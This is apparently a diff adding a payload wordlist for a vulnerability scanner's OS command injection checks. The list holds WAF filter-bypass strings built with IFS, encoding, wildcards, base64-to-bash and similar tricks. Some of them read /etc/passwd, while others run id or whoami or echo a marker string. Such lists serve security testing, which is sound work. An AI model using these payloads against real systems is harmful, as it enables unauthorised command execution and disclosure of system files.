@@ -1,0 +1,109 @@
+# OS Command Injection - Filter Bypass Payloads
+# Used when basic payloads are blocked by WAF/filters
+# Techniques: encoding, concatenation, wildcards, IFS manipulation
+
+# IFS (Internal Field Separator) bypass for spaces
+;{IFS}id
+;echo${IFS}JARWIS_CMDI_MARKER
+;cat${IFS}/etc/passwd
+${IFS}id
+;a]
+${IFS};id
+;$IFS'id'
+
+# Tab instead of space (%09)
+;echo%09JARWIS_CMDI_MARKER
+;cat%09/etc/passwd
+%09id
+%09whoami
+
+# String concatenation bypass
+;ec''ho JARWIS_CMDI_MARKER
+;ec""ho JARWIS_CMDI_MARKER
+;e\cho JARWIS_CMDI_MARKER
+;wh''oami
+;wh""oami
+;w\hoami
+;i''d
+;i""d
+
+# Variable-based bypass
+;a=i;b=d;$a$b
+;a=who;b=ami;$a$b
+;a=ec;b=ho;$a$b JARWIS_CMDI_MARKER
+;X=who;Y=ami;$X$Y
+
+# Hex encoding (printf)
+;$(printf '\x69\x64')
+;$(printf '\x77\x68\x6f\x61\x6d\x69')
+;$(printf '\x65\x63\x68\x6f\x20\x4a\x41\x52\x57\x49\x53')
+|$(printf '\x69\x64')
+`printf '\x69\x64'`
+
+# Octal encoding
+;$(printf '\151\144')
+;$(printf '\167\150\157\141\155\151')
+
+# Base64 bypass
+;echo aWQ=|base64 -d|bash
+;echo d2hvYW1p|base64 -d|bash
+;$(echo aWQ=|base64 -d)
+;`echo aWQ=|base64 -d`
+;bash -c "$(echo aWQ=|base64 -d)"
+
+# Wildcard bypass
+;/???/??
+;/???/i?
+;/???/?d
+;/???/??oami
+;/???/c?t /???/??sswd
+;/b?n/?d
+;/b?n/who?mi
+;/u??/b??/id
+
+# Brace expansion
+;{id,}
+;{whoami,}
+;{echo,JARWIS_CMDI_MARKER}
+
+# Dollar sign variations
+;$()id
+;$$id
+;$($(id))
+
+# Newline and carriage return variations
+$'\n'id
+$'\r'id
+$'\n'whoami
+
+# Unicode/alternative encodings
+;i%00d
+;who%00ami
+%0Aid
+%0Awhoami
+
+# Slash substitution
+;${PATH:0:1}etc${PATH:0:1}passwd
+;cat ${HOME:0:1}etc${HOME:0:1}passwd
+
+# Backtick variations
+;`\i\d`
+;`\w\h\o\a\m\i`
+
+# Rev (reverse command)
+;$(rev<<<'di')
+;$(rev<<<'imaohw')
+
+# Comment injection
+;id#
+;id;//
+;id%00
+;id%0a
+;id/*comment*/
+;id --
+
+# Case manipulation (may work on case-insensitive systems)
+;ID
+;WHOAMI
+;iD
+;WhOaMi
